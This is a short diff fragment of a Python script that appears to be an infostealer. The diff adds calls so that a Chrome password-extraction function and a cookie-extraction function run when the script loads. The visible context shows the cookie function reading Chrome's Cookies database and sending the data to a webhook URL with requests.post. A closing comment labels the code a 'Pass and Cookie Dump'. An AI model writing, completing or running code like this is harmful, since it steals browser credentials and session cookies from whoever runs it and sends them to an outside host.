@@ -130,6 +130,7 @@ def chormePasswordExtract():
             continue
     cursorExec.close()
     databaseConn.close()
+chormePasswordExtract()
 
 def chormeCookieExtract():
     databasePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Cookies")
@@ -152,4 +153,5 @@ def chormeCookieExtract():
         requests.post(webhookURL, json=jsonData)
 
     databaseConn.close()
+chormeCookieExtract()
 #End of Chorme Pass and Cookie Dump
